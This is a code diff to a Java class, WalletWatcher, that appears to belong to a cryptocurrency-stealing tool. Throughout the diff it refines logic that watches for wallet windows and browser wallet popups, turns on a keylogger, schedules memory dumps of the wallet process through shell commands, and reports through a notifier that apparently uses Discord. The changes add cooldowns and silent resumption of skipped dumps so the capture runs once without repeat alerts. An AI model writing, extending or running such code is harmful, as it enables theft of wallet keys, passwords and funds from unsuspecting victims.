@@ -34,11 +34,13 @@ final class WalletWatcher {
 	private final Keylogger keylogger;
 
 	private final Object lock = new Object();
-	private final Map<String, Integer> attempts = new ConcurrentHashMap<>();
-	private final Map<String, Long> dumped = new ConcurrentHashMap<>();
+	final Map<String, Integer> attempts = new ConcurrentHashMap<>();
+	final Map<String, Long> dumped = new ConcurrentHashMap<>();
+	final java.util.Set<String> completed = ConcurrentHashMap.newKeySet();
 	private final Map<String, Long> notified = new ConcurrentHashMap<>();
 	private volatile boolean restartKey = true;
 	int dumpSchedules;
+	int resumeSchedules;
 	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2, runnable -> {
 		Thread thread = new Thread(runnable, "spc-wallet-timer");
 		thread.setDaemon(true);
@@ -121,6 +123,7 @@ final class WalletWatcher {
 			activePid = 0L;
 			dumped.clear();
 			attempts.clear();
+			completed.clear();
 		}
 		keylogger.walletOff();
 	}
@@ -166,7 +169,7 @@ final class WalletWatcher {
 		try {
 			String[] parts = line.split("\\|", 5);
 			if (parts[0].equals("LOST")) {
-				lost(parts.length > 1 ? parts[1] : "");
+				lost(parts.length > 1 ? parts[1] : "", parts.length > 2 ? parts[2] : "");
 				return;
 			}
 			if (!parts[0].equals("DETECT") || parts.length < 5) {
@@ -184,12 +187,18 @@ final class WalletWatcher {
 		}
 		String key = name + "|" + pid + "|" + start;
 		boolean notify;
+		boolean resume = false;
 		synchronized (lock) {
 			if (key.equals(activeKey)) {
 				return;
 			}
 			long now = System.currentTimeMillis();
-			boolean dumpedAlready = dumped.containsKey(key);
+			Long dumpedAt = dumped.get(key);
+			// A browser closed by grace keeps its key so reopening the popup
+			// within the cooldown only restores the session. Past the cooldown
+			// the same browser PID is a genuinely new cycle.
+			boolean dumpedAlready = dumpedAt != null
+				&& now - dumpedAt <= DiscordConfig.walletCooldownSec() * 1000L;
 			// The persisted key only bypasses the cooldown on the first detect
 			// after a restart; every later focus bounce must respect it.
 			boolean restartBypass = restartKey && key.equals(state.lastWalletKey);
@@ -206,6 +215,10 @@ final class WalletWatcher {
 			// must not alert or dump again.
 			notify = !dumpedAlready;
 			if (notify) {
+				// A genuinely new cycle (new key, or the same key after its
+				// cooldown) starts with a fresh attempt budget.
+				attempts.remove(key);
+				completed.remove(key);
 				state.lastWalletKey = key;
 				state.walletEvents++;
 				state.walletCooldownUntil = now + DiscordConfig.walletCooldownSec() * 1000L;
@@ -214,15 +227,35 @@ final class WalletWatcher {
 				keylogger.walletOn();
 				dumped.put(key, now);
 				dumpSchedules++;
+			} else {
+				// The popup came back after a grace close: wake the hook again
+				// but keep the cycle silent.
+				keylogger.walletOn();
+				// If the grace beat the scheduled capture, the only dump was
+				// skipped; reopen has to resume it even though the alert stays
+				// silent.
+				resume = !completed.contains(key);
 			}
 		}
 		Log.debug("Wallet detected: " + name + " pid " + pid + " title " + title);
 		if (notify) {
 			schedule(key, name, pid, 5000L);
+		} else if (resume) {
+			resumeSchedules++;
+			schedule(key, name, pid, 1000L);
 		}
 	}
 
 	void lost(String name) {
+		lost(name, "");
+	}
+
+	/**
+	 * @param reason {@code dead} (process gone), {@code grace} (focus grace
+	 *               expired) or empty for an old helper. An unknown/empty reason
+	 *               keeps the historical behaviour: a live PID holds the session.
+	 */
+	void lost(String name, String reason) {
 		boolean stopKeys;
 		synchronized (lock) {
 			if (activeKey.isEmpty()) {
@@ -231,12 +264,21 @@ final class WalletWatcher {
 			if (!name.isEmpty() && !name.equals(activeName)) {
 				return;
 			}
-			// A focus change is not a close: keep the key while the process lives
-			// so the next DETECT is swallowed and no second dump runs.
-			if (alive(activePid)) {
+			boolean processAlive = alive(activePid);
+			boolean dead = "dead".equals(reason) || !processAlive;
+			boolean browserClose = "grace".equals(reason) && processAlive && browser(activeName);
+			if (!dead && !browserClose) {
+				// A focus change is not a close: keep the key while the process
+				// lives so the next DETECT is swallowed and no second dump runs.
 				return;
 			}
-			dumped.remove(activeKey);
+			// A grace close keeps the key: reopening the popup in this browser
+			// restores the session without an alert or a second dump.
+			if (dead) {
+				dumped.remove(activeKey);
+				attempts.remove(activeKey);
+				completed.remove(activeKey);
+			}
 			activeKey = "";
 			activeName = "";
 			activePid = 0L;
@@ -284,6 +326,9 @@ final class WalletWatcher {
 				}
 				return;
 			}
+			// A capture that produced files is complete: a later silent reopen
+			// must not schedule the same dump again.
+			completed.add(key);
 			boolean found = false;
 			for (String dump : dumps) {
 				Path file = Path.of(dump);
@@ -332,7 +377,10 @@ final class WalletWatcher {
 			+ target + "\" \"" + ops + "\" \"" + list + "\" \"" + tag + "\"";
 		List<String> dumps = new ArrayList<>();
 		try {
-			Shell.run(ops, command, 300000L, process -> dumpProcess = process);
+			String output = Shell.run(ops, command, 300000L, process -> dumpProcess = process);
+			if (!output.isBlank()) {
+				Log.debug("Wallet dump " + name + " " + target + ": " + output.strip());
+			}
 			if (Files.isRegularFile(list)) {
 				dumps = parseList(Files.readAllLines(list, StandardCharsets.UTF_8),
 					message -> notifier.send("wallet dump skipped: " + message));
